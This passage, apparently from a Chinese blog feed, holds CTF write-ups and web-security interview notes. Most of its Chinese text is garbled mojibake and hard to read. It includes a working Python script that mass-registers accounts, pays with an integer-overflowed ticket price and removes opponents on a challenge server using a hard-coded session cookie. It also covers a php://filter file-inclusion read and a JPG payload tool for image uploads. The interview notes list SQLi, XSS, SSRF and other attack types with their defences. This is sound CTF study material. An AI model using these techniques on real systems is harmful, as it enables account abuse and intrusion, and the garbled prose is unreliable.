å›¾ç‰‡ï¼Œç„¶åä¸‹è½½ä¸‹æ¥ï¼Œå‘ç°å’ŒåŸæ¥çš„å›¾ç‰‡å‘ç”Ÿäº†å˜åŒ–ï¼Œä¸Šä¼ æ­£å¸¸å›¾ç‰‡éƒ½è¢«å¤„ç†è¿‡äº†<br> éœ€è¦æ³¨æ„çš„æ˜¯æ— è®ºä¸Šä¼ ä»€ä¹ˆå›¾ç‰‡éƒ½ä¼šè¢«è½¬åŒ–ä¸º jpgï¼Œæ‰€ä»¥ä½¿ç”¨ jpg æ¥æ„é€ æ›´å¥½ã€‚<br> ç›´æ¥è„šæœ¬<br> <a href="https://github.com/BlackFan/jpg_payload" target="_blank" rel="noopener">https://github.com/BlackFan/jpg_payload</a></p><p> Usage: php jpg_payload.php &lt;jpg_name.jpg&gt;<br>ç”¨è¿™ä¸ªå·¥å…·ç”Ÿæˆå¯ä»¥GDæ¸²æŸ“å¤„ç†åï¼Œä¾ç„¶èƒ½ä¿ç•™å­—ç¬¦ä¸²çš„jpgï¼Œåœ¨pyæºç ä¸­æŠŠå­—ç¬¦ä¸²æ”¹ä¸ºphpinfo()ï¼Œç„¶åç”Ÿæˆã€‚<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g2ah8lv0u4j30bt0680st.jpg" alt=""></p><h1 id="homebrew-event-loop"><a href="#homebrew-event-loop" class="headerlink" title="homebrew event loop"></a>homebrew event loop</h1><p> <img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g2ah9tu2v1j30rt0aaaad.jpg" alt=""></p> <figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># flagè·å–å‡½æ•°</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">FLAG</span><span class="params">()</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ä»¥ä¸‹ä¸‰ä¸ªå‡½æ•°è´Ÿè´£å¯¹å‚æ•°è¿›è¡Œè§£æã€‚</span></span><br><span class="line"><span class="comment"># 1. æ·»åŠ logï¼Œå¹¶å°†å‚æ•°åŠ å…¥é˜Ÿåˆ—</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">trigger_event</span><span class="params">(event)</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. å·¥å…·å‡½æ•°ï¼Œè·å–prefixä¸postfixä¹‹é—´çš„å€¼</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_mid_str</span><span class="params">(haystack, prefix, postfix=None)</span></span><span class="symbol">:</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. ä»é˜Ÿåˆ—ä¸­å–å‡ºå‡½æ•°ï¼Œå¹¶åˆ†æåï¼Œè¿›è¡Œæ‰§è¡Œã€‚ï¼ˆç¨åè¿›è¡Œè¯¦ç»†åˆ†æï¼‰</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">execute_event_loop</span><span class="params">()</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ç½‘ç«™å…¥å£ç‚¹</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">entry_point</span><span class="params">()</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment"># é¡µé¢æ¸²æŸ“ï¼Œä¸‰ä¸ªé¡µé¢:index/shop/reset</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">view_handler</span><span class="params">()</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¸‹è½½æºç </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index_handler</span><span class="params">(args)</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å¢åŠ é’»çŸ³</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">buy_handler</span><span class="params">(args)</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment"># è®¡ç®—ä»·é’±ï¼Œè¿›è¡Œå‡é’±</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">consume_point_function</span><span class="params">(args)</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment"># è¾“å‡ºflag</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_flag_function</span><span class="params">(args)</span></span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag_handler</span><span class="params">(args)</span></span></span><br></pre></td></tr></table></figure><h1 id="å¤§å‰å¤§åˆ©ï¼Œä»Šæ™šåƒé¸¡"><a href="#å¤§å‰å¤§åˆ©ï¼Œä»Šæ™šåƒé¸¡" class="headerlink" title="å¤§å‰å¤§åˆ©ï¼Œä»Šæ™šåƒé¸¡"></a>å¤§å‰å¤§åˆ©ï¼Œä»Šæ™šåƒé¸¡</h1><p> <img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g2amsnq1xsj30sg0g5412.jpg" alt=""></p><p> å°è¯•sqlæ³¨å…¥  æ— æœ</p><p> æ³¨å†Œè´¦å· ç™»å…¥ ç‚¹å‡»è´­ä¹°ï¼Œæ”¯ä»˜   å‘ç°ä½™é¢ä¸è¶³ï¼ŒæŸ¥çœ‹é¡µé¢ å‘ç°è¯·æ±‚äº†è¿™ä¸ªé¡µé¢<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g2anbqd89hj311o0ii40a.jpg" alt=""></p><p>å¼€å§‹ä¼ªé€ ä»·æ ¼ï¼Œå‘ç°åç«¯æŒ‰èŒƒå›´æ˜¯åˆ†åˆ«ä»¥32ä½å’Œ64ä½å¤„ç†ï¼Œå› ä¸º64ä½æœ€å¤§æ•´æ•°+1æŠ¥é”™ï¼Œ32ä½æœ€å¤§æ•´æ•°+1æŠ¥é”™ï¼Œç„¶è€Œå…¶ä¸­é—´çš„æŸèŒƒå›´æ•°ä¸æŠ¥é”™ã€‚ç»è¿‡æµ‹è¯•å‘ç°æäº¤32ä½æœ€å¤§æ•´æ•°*2+2åˆ°100çš„æ•°å°±å¯ä¹°ç¥¨ï¼Œæ¯”å¦‚4294967296</p><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g2ani51fabj30y60bajrt.jpg" alt=""></p><p>è¿›åˆ°æ¸¸æˆä¹‹åï¼Œå¯ä»¥é€šè¿‡æäº¤æ­£ç¡®idä¸ticketæ¥ç§»é™¤å¯¹æ‰‹ï¼Œæ²¡ä»€ä¹ˆå¥½åŠæ³•ï¼Œç»è¿‡ä¸€ç•ªå°è¯•äº†è§£åˆ°idä¸ticketæ˜¯å›ºå®šå¯¹åº”çš„å…³ç³»ï¼Œåªæœ‰å†™è„šæœ¬é€šè¿‡æš´åŠ›æ³¨å†Œè·å–å°½å¯èƒ½å¤šçš„idï¼Œç„¶åä¸€ä¸€åˆ é™¤</p><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g2ao4dixo7j30en07w0sp.jpg" alt=""></p><p>ç„¶åæ‰¹é‡æ³¨å†Œå°å·æ‰¹é‡ä¹°å…¥åœºåˆ¸æ‰¹é‡æ‹¿idå’Œtokenç»™å¤§å·æ·˜æ±°</p><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">0</span>,<span class="number">1000</span>):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    url1 = <span class="string">"http://117.51.147.155:5050/ctf/api/register?name=evoa0&#123;0&#125;&amp;password=xxxxxxxxxxxx"</span>.format(<span class="built_in">str</span>(i))</span><br><span class="line">    url2 = <span class="string">"http://117.51.147.155:5050/ctf/api/buy_ticket?ticket_price=42949672961"</span></span><br><span class="line">    url3 = <span class="string">"http://117.51.147.155:5050/ctf/api/pay_ticket?bill_id="</span></span><br><span class="line">    url4 = <span class="string">"http://117.51.147.155:5050/ctf/api/remove_robot?ticket=&#123;0&#125;&amp;id=&#123;1&#125;"</span></span><br><span class="line">    rep1 = requests.<span class="built_in">get</span>(url1)</span><br><span class="line"></span><br><span class="line">    cook1name = rep1.cookies[<span class="string">"user_name"</span>]</span><br><span class="line">    cook1sess = rep1.cookies[<span class="string">"REVEL_SESSION"</span>]</span><br><span class="line">    urlcookies=&#123;<span class="string">"user_name"</span>:cook1name,<span class="string">"REVEL_SESSION"</span>:cook1sess&#125;</span><br><span class="line"></span><br><span class="line">    rep2 = requests.<span class="built_in">get</span>(url2,cookies=urlcookies)</span><br><span class="line">    billid = rep2.json()[<span class="string">'data'</span>][<span class="number">0</span>][<span class="string">"bill_id"</span>]</span><br><span class="line"></span><br><span class="line">    rep3 = requests.<span class="built_in">get</span>(url3+billid,cookies=urlcookies)</span><br><span class="line">    userid = rep3.json()[<span class="string">'data'</span>][<span class="number">0</span>][<span class="string">"your_id"</span>]</span><br><span class="line">    userticket = rep3.json()[<span class="string">'data'</span>][<span class="number">0</span>][<span class="string">"your_ticket"</span>]</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    rep4 = requests.<span class="built_in">get</span>(url4.format(userticket,<span class="built_in">str</span>(userid)),cookies=&#123;<span class="string">"user_name"</span>:<span class="string">"evoA002"</span>,<span class="string">"REVEL_SESSION"</span>:<span class="string">"675dc6a259890db618c598e0cd9f9802"</span>&#125;)</span><br><span class="line">    <span class="built_in">print</span>(url4.format(userticket,<span class="built_in">str</span>(userid)))</span><br><span class="line">    with <span class="built_in">open</span>(<span class="string">"chicken.txt"</span>,<span class="string">"a"</span>) as txt:</span><br><span class="line">        txt.write(<span class="built_in">str</span>(userid) + <span class="string">":"</span> +userticket)</span><br><span class="line">        txt.write(<span class="string">"\n"</span>)</span><br></pre></td></tr></table></figure><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g2ao8bm62yj30i507uaal.jpg" alt=""></p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>2019è¥¿æ¹–è®ºå‰‘writeup</title>
      <link href="/2019/04/11/2019%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91writeup/"/>
      <url>/2019/04/11/2019%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91writeup/</url>
      
        <content type="html"><![CDATA[<p><meta name="referrer" content="no-referrer"></p><h1 id="babyt3"><a href="#babyt3" class="headerlink" title="babyt3"></a>babyt3</h1><p>çœ‹åˆ°<code>include $_GET[&#39;file&#39;]</code>å°è¯•æ–‡ä»¶åŒ…å«ç”¨<code>php://filter</code>è¯»å–indexæ–‡ä»¶,æˆåŠŸè¯»å– è§£ç å¾—åˆ°å¦‚ä¸‹:<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$a = @$_GET[<span class="string">'file'</span>];</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (!$a) &#123;</span></span><br><span class="line"><span class="php">$a = <span class="string">'./templates/index.html'</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">'include $_GET[\'file\']'</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (strpos(<span class="string">'flag'</span>,$a)!==<span class="keyword">false</span>) &#123;</span></span><br><span class="line"><span class="php"><span class="keyword">die</span>(<span class="string">'nonono'</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">include</span> $a;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--hint: ZGlyLnBocA== --&gt;</span></span><br></pre></td></tr></table></figure></p><p>æç¤ºæœ‰dir.php ç»§ç»­è¯»å–dir.php<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$a = @$_GET[<span class="string">'dir'</span>];</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(!$a)&#123;</span></span><br><span class="line"><span class="php">$a = <span class="string">'/tmp'</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">var_dump(scandir($a));</span></span><br></pre></td></tr></table></figure></p><p>åˆ†æ:<br>index.php<br>è·å–fileå€¼ æ£€æŸ¥æ˜¯å¦å‡ºç°flag<br>dir.php<br>åˆ—å‡ºç›®å½•ç»“æ„</p><p>å…ˆåœ¨dir.phpä¸­æŸ¥çœ‹ç›®å½•<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1yx9205u1j30wh0ioq3x.jpg" alt=""><br>ç„¶ååœ¨index.phpä¸­è¯»å–<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1yx9q7wypj30vs08laac.jpg" alt=""><br>è§£ç å¾—åˆ°flag<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1yxahyuwhj30um0fsmxk.jpg" alt=""></p><p>#</p><p>#</p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>webå®‰å…¨ç›¸å…³é¢è¯•æ€»ç»“</title>
      <link href="/2019/04/11/web%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3%E9%9D%A2%E8%AF%95%E6%80%BB%E7%BB%93/"/>
      <url>/2019/04/11/web%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3%E9%9D%A2%E8%AF%95%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p><meta name="referrer" content="no-referrer"><br>â€œå¦‚æœä¸€ä¸ªäººä½ï¼Œåƒä¸‡ä¸è¦åœ¨ä¸‹åˆæ—¶ç¡åˆè§‰ï¼Œä¸€è§‰ç¡åˆ°å…­ä¸ƒç‚¹ç­‰ä½ ä¸€çå¼€çœ¼ï¼Œçœ‹ç€æœ¦èƒ§é»‘é»‘çš„å¤©ç©ºï¼Œçœ‹ç€ç©ºè¡çš„æˆ¿é—´ï¼Œä¼šæœ‰ä¸€ç§è¢«å…¨ä¸–ç•Œé—å¼ƒçš„æ„Ÿè§‰ï¼Œå­¤ç‹¬åœ¨é‚£ä¸€åˆ»ä½“ç°çš„æ·‹æ¼“å°½è‡´ã€‚â€<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1ynhi655kj30k00k0wei.jpg" alt=""></p><h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>æ”¶é›†å’Œæ€»ç»“ä¸€äº›webå®‰å…¨é¢è¯•å¯èƒ½ä¼šé—®åˆ°çš„é—®é¢˜ï¼Œæœ¬æ–‡åªæ˜¯å†™ä¸ªå¤§æ¦‚ï¼Œæä¾›ä¸€ä¸ªæ–¹å‘ï¼Œä¸ä¼šåœ¨æŸä¸ªé—®é¢˜è®²å¤ªæ·±ï¼Œä»¥ä¸‹éƒ½æ˜¯ç”¨æœ¬äººé€šä¿—çš„è¯æ¥è®²ï¼Œéš¾å…ä¼šæœ‰ä¸æ­£ç¡®çš„ã€‚</p><h1 id="åŸºæœ¬æ¼æ´è®²è§£"><a href="#åŸºæœ¬æ¼æ´è®²è§£" class="headerlink" title="åŸºæœ¬æ¼æ´è®²è§£"></a>åŸºæœ¬æ¼æ´è®²è§£</h1><h2 id="sqlæ³¨å…¥"><a href="#sqlæ³¨å…¥" class="headerlink" title="sqlæ³¨å…¥"></a>sqlæ³¨å…¥</h2><p><strong>åŸç†:</strong><br>æ²¡æœ‰å¯¹è¾“å…¥ç”Ÿæˆçš„æ•°æ®è¿›è¡Œè¿‡æ»¤æˆ–è¿‡æ»¤ä¸å½“ï¼Œèƒ½å¤Ÿé€šè¿‡æ„é€ æ„é€ æ¶æ„çš„è¾“å…¥æ¥æ”¹å˜sqlè¯­å¥çš„ç»“æ„</p><p><strong>åˆ¤æ–­</strong><br>é€šè¿‡æ„é€ æ¡ä»¶è¯­å¥ï¼Œæ¥æŸ¥çœ‹é¡µé¢æ˜¯å¦å‘ç”Ÿå˜åŒ–ï¼Œä¾‹å¦‚:åŠ å•å¼•å·,åŠ  2-1ï¼Œsleep()éªŒè¯</p><p><strong>æ³¨å…¥ç±»å‹</strong><br>get<br>post<br>cookie</p><p><strong>æ³¨å…¥æ–¹å¼</strong><br><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">union</span>æ³¨å…¥</span></span><br><span class="line">åˆ©ç”¨<span class="class"><span class="keyword">union</span> <span class="title">slect</span> ç­‰ç­‰</span></span><br><span class="line"></span><br><span class="line">æŠ¥é”™æ³¨å…¥</span><br><span class="line">åˆ©ç”¨rand()+floor(),exp(),updatexml(),polygon()ç­‰ç­‰</span><br><span class="line"></span><br><span class="line">ç›²æ³¨(boolç›²æ³¨å’Œæ—¶é—´ç›²æ³¨)</span><br><span class="line">åˆ©ç”¨subtr(),<span class="keyword">if</span>(),ascii()ç­‰ç­‰ã€</span><br><span class="line"></span><br><span class="line">å®½å­—èŠ‚æ³¨å…¥</span><br></pre></td></tr></table></figure></p><p><strong>é˜²å¾¡</strong><br>Â·ä½¿ç”¨é¢„ç¼–è¯‘è¯­å¥<br>Â·å…³é—­é”™è¯¯æç¤º<br>Â·å¼ºåˆ¶ç±»å‹è½¬æ¢</p><h2 id="è·¨ç«™è„šæœ¬XSS"><a href="#è·¨ç«™è„šæœ¬XSS" class="headerlink" title="è·¨ç«™è„šæœ¬XSS"></a>è·¨ç«™è„šæœ¬XSS</h2><p><strong>åŸç†</strong><br>å‘ç½‘é¡µå†™å…¥æ¶æ„è„šæœ¬ï¼Œå½“å…¶ä»–ç”¨æˆ·è¿›è¡Œæµè§ˆæ—¶ï¼Œå°±ä¼šè§¦å‘æ¶æ„ä»£ç è¿›è¡Œæ¶æ„æ“ä½œ</p><p><strong>ç±»å‹</strong><br>åå°„æ€§(ä¸€æ¬¡æ€§)<br>ä¸€èˆ¬åœ¨urlä¸­æ„é€ æ¶æ„ä»£ç ï¼Œå‘é€ç»™å…¶ä»–ç”¨æˆ·ç‚¹å‡»æ‰§è¡Œç›¸å…³æ“ä½œ</p><p>å­˜å‚¨å‹(æ°¸ä¹…æ€§)<br>ä¸€èˆ¬åœ¨è¿›è¡Œè¡¨å•æäº¤ï¼Œæ¯”å¦‚ç•™è¨€æ¿ï¼Œåœ¨è¡¨å•æäº¤æ¶æ„ä»£ç å­˜åˆ°æ•°æ®åº“ï¼Œå½“å…¶ä»–ç”¨æˆ·æµè§ˆæ—¶ä¼šè§¦å‘ï¼Œå½±å“å¤§é‡ç”¨æˆ·</p><p>domå‹(åŸºäº)<br>é€šè¿‡ä¿®æ”¹domç»“æ„æ¥æ“ä½œdomå¯¹è±¡è¿›è¡Œæ³¨å…¥</p><p><strong>é˜²å¾¡</strong><br>Â·è¿›è¡Œè½¬ä¹‰è¾“å‡º<br>Â·è®¾ç½®httponly(ç¦æ­¢jsè·å–cookieå€¼)</p><h2 id="csrf-å¤¸ç«™è¯·æ±‚ä¼ªé€ "><a href="#csrf-å¤¸ç«™è¯·æ±‚ä¼ªé€ " class="headerlink" title="csrf(å¤¸ç«™è¯·æ±‚ä¼ªé€ )"></a>csrf(å¤¸ç«™è¯·æ±‚ä¼ªé€ )</h2><p><strong>åŸç†</strong><br>æœåŠ¡å™¨æ²¡æœ‰å¯¹è¯·æ±‚æ¥æºè¿›è¡Œè¿‡æ»¤éªŒè¯è€Œå¯¼è‡´å—å®³è€…æ‰§è¡Œæ”»å‡»ä»£ç ï¼Œä¸€èˆ¬æ˜¯åœ¨æ¶æ„ç½‘ç«™å‘å…¶ä»–ç½‘ç«™æ‰§è¡Œäº†æ¶æ„æ“ä½œ</p><p><strong>åˆ¤æ–­</strong><br>æŠ“å–æ­£å¸¸è¯·æ±‚åŒ…ï¼Œå»æ‰refereré‡æ–°æäº¤ï¼Œå¦‚æœæäº¤è¿˜æœ‰æ•ˆï¼Œè¯´æ˜å­˜åœ¨ssrf</p><p><strong>é˜²å¾¡</strong><br>è®¾ç½®token(æœåŠ¡å™¨ç”Ÿæˆä¸€ä¸ªéšæœºç»™å®¢æˆ·ç«¯ï¼Œå®¢æˆ·ç‚¹æºå¸¦éšæœºæ•°è¿›è¡Œè¯·æ±‚)<br>éªŒè¯refere</p><h2 id="ssrf-æœåŠ¡ç«¯è¯·æ±‚ä¼ªé€ "><a href="#ssrf-æœåŠ¡ç«¯è¯·æ±‚ä¼ªé€ " class="headerlink" title="ssrf(æœåŠ¡ç«¯è¯·æ±‚ä¼ªé€ )"></a>ssrf(æœåŠ¡ç«¯è¯·æ±‚ä¼ªé€ )</h2><p><strong>åŸç†</strong><br>æ²¡æœ‰å¯¹æœåŠ¡å™¨è¯·æ±‚çš„å†…å®¹è¿›è¡Œè¿‡æ»¤é€ æˆå¯ä»¥ä»å¤–ç½‘è®¿é—®å†…ç½‘è¿›è¡Œæ”»å‡»</p><p><strong>åˆ¤æ–­</strong><br>åœ¨å›¾ç‰‡åœ°å€æˆ–è€…urlä¸­è¿›è¡Œæ„é€ </p><p><strong>é˜²å¾¡</strong><br>Â·ç¦ç”¨ä¸éœ€è¦çš„åè®® ç±»ä¼¼äº<code>file:// , gopher://, ftp://</code><br>Â·é™åˆ¶ç«¯å£</p><h2 id="XXEæ¼æ´"><a href="#XXEæ¼æ´" class="headerlink" title="XXEæ¼æ´"></a>XXEæ¼æ´</h2><p><strong>åŸç†</strong><br>å½“åº”ç”¨ç¨‹åºç¨‹åºèƒ½å¤Ÿè§£æxmlæ—¶ï¼Œå¦‚æœå¯ä»¥å¼•ç”¨å¤–éƒ¨å®ä½“ï¼Œå¯ä»¥é€šè¿‡æ„é€ æ¶æ„å‘½ä»¤æ‰§è¡Œæ¶æ„æ“ä½œï¼Œå†…ç½‘æ”»å‡»ï¼Œä»»æ„æ–‡ä»¶è¯»å–</p><p><strong>é˜²å¾¡</strong><br>ç¦æ­¢å¯¹å¤–éƒ¨å®ä½“çš„è®¿é—®<br>è¿‡æ»¤xmlæ•°æ®</p><h2 id="è§£ææ¼æ´"><a href="#è§£ææ¼æ´" class="headerlink" title="è§£ææ¼æ´"></a>è§£ææ¼æ´</h2><p><strong>IIS</strong><br>XX.ASPç›®å½•ä¸‹çš„é—®ä»·ä¼šè¢«å½“åšaspæ–‡ä»¶æ‰§è¡Œ<br>xx.asp;.jpg ;è¡¨ç¤ºæˆªæ­¢ï¼Œä¸ä¼šè§£æ;åé¢çš„å†…å®¹  ä¼šè¢«å½“åšaspæ–‡ä»¶æ‰§è¡Œ</p><p><strong>Apache</strong><br>æ–‡ä»¶åè§£æä»å³åˆ°å·¦</p><p><strong>Nginx</strong><br>xx.jpg/.php ä¼šè¢«å½“åšphpæ‰§è¡Œ<br>å­˜åœ¨00æˆªæ–­</p><h2 id="æ–‡ä»¶åŒ…å«"><a href="#æ–‡ä»¶åŒ…å«" class="headerlink" title="æ–‡ä»¶åŒ…å«"></a>æ–‡ä»¶åŒ…å«</h2><p><strong>åŸç†</strong><br>è¿‡æ»¤åŒ…å«æ–‡ä»¶å‡½æ•°ä¸­çš„å‚æ•°å¯æ§ å¯å¯¼è‡´ä»»æ„æ–‡ä»¶</p><p>æœ¬åœ°åŒ…å«: åŒ…å«æ–‡ä»¶çš„å‚æ•°å¯æ§ åœ¨è¿›è¡ŒåŒ…å«æ—¶æ²¡æœ‰è¿›è¡Œè¿‡æ»¤ å¯¼è‡´çš„å¤¸ç›®å½•è¯»å–æ–‡ä»¶<br>è¿œç¨‹åŒ…å«: ç”¨æˆ·çš„è¾“å…¥æ²¡æœ‰è¿›è¡Œè¿‡æ»¤ é€šè¿‡è®¿é—®è¿œç¨‹æœåŠ¡å™¨ä¸‹çš„shellæ–‡ä»¶</p><p><strong>åŒ…å«æ–¹å¼</strong><br>åŒ…å«ä¸Šä¼ æ–‡ä»¶<br>åˆ©ç”¨ä¼ªåè®®ï¼Œphp://input(å†™ä¸€å¥è¯),data://(æ‰§è¡Œå‘½ä»¤),php://filter(è¯»å–æ–‡ä»¶å†…å®¹)<br>åŒ…å«æ—¥å¿—æ–‡ä»¶<br>åŒ…å«session<br><strong>é˜²å¾¡</strong><br>è®¾ç½®allow_url_include,å…³é—­allow_url_fopen<br>ä½¿ç”¨open_basedirè¿›è¡Œé™åˆ¶åŒ…å«<br>è¿‡æ»¤åŒ…å«æ–‡ä»¶å‡½æ•°ä¸­çš„å‚æ•°</p><h2 id="æ–‡ä»¶ä¸Šä¼ "><a href="#æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="æ–‡ä»¶ä¸Šä¼ "></a>æ–‡ä»¶ä¸Šä¼ </h2><p><strong>åŸç†</strong><br>æ²¡æœ‰å¯¹æ–‡ä»¶çš„åç¼€åè¿‡æ»¤æˆ–è€…å¯ç»•è¿‡ä»è€Œä¸Šä¼ å±é™©æ–‡ä»¶</p><p><strong>é˜²å¾¡</strong><br>ç¦æ­¢ä¸Šä¼ ç›®å½•æœ‰æ‰§è¡Œå‘½ä»¤æƒé™<br>æ–‡ä»¶è·¯å¾„å+æ–‡ä»¶åå†™æ­»</p><h1 id="é¢è¯•å¸¸è§é—®é¢˜"><a href="#é¢è¯•å¸¸è§é—®é¢˜" class="headerlink" title="é¢è¯•å¸¸è§é—®é¢˜"></a>é¢è¯•å¸¸è§é—®é¢˜</h1><p><strong>apacheå’ŒnginxåŒºåˆ«</strong><br>apache æ€§èƒ½é«˜ æ¨¡å—å¤š æ›´ç¨³å®š åŠ¨é™ç¼–è¯‘<br>nigix è½»é‡çº§ é™æ€ç¼–è¯‘</p><p><strong>æ€ä¹ˆåˆ¤æ–­æ˜¯å¦åŒæº</strong><br>å¦‚æœ ä¸¤ä¸ªé¡µé¢çš„ åè®® ç«¯å£å· å’Œ åŸŸå ç›¸åŒ  åˆ™ä¸¤ä¸ªé¡µé¢ åŒæº</p><p><strong>php.iniçš„ä¸€äº›å®‰å…¨é…ç½®</strong><br>æ‰“å¼€å®‰å…¨æ¨¡å¼<br>å…³é—­å±é™©å‡½æ•°<br>å…³é—­æ³¨å†Œå…¨å±€å˜é‡<br>å…³é—­é”™è¯¯å›æ˜¾<br>é™åˆ¶æ´»åŠ¨ç›®å½•<br>å¢åŠ é”™è¯¯æ—¥å¿—</p><p><strong>å¦‚ä½•è¿›è¡Œä¿¡æ¯æ”¶é›†</strong><br>è·å–çœŸå®ip<br>æ•æ„Ÿç›®å½•æ‰«æ<br>å­åŸŸåçˆ†ç ´<br>ç«¯å£æ‰«æ<br>cæ®µæ‰«æ<br>cmsè¯†åˆ«<br>ä¸­é—´ä»¶ç‰ˆæœ¬</p><p><strong>myslqæ³¨å…¥ 5.0 ä»¥ä¸Šå’Œ5.0 ä»¥ä¸‹æœ‰ä»€ä¹ˆåŒºåˆ«</strong><br>5.0ä»¥ä¸‹æ²¡æœ‰information_schema è¿™ä¸ªè¡¨</p><p><strong>SSRF å’Œ CSRF æœ‰ä»€ä¹ˆåŒºåˆ«</strong><br>SSRF ç”±æœåŠ¡å™¨å‘èµ·<br>CSRF æœ‰å®¢æˆ·ç«¯å‘èµ·</p><p><strong>cookie ä¸session çš„åŒºåˆ«</strong><br>cookie å­˜åœ¨äºæœ¬åœ°<br>sesion å­˜åœ¨äºæœåŠ¡å™¨ è¿”å›ä¸€ä¸ªID ä½œä¸ºä¸€ä¸ªcookie</p><p><strong>å“åº”ç äº†è§£å¤šå°‘</strong><br>404 æ–‡ä»¶ä¸å­˜åœ¨ä¸<br>403 ç¦æ­¢è®¿é—®<br>500 æœåŠ¡å™¨é”™è¯¯<br>302 é‡å®šå‘<br>401 è¯·æ±‚æœªç»æˆæƒ</p><p><strong>å¸¸è§ç«¯å£å·</strong><br>22 ssh<br>21 ftp<br>23 telnet<br>443 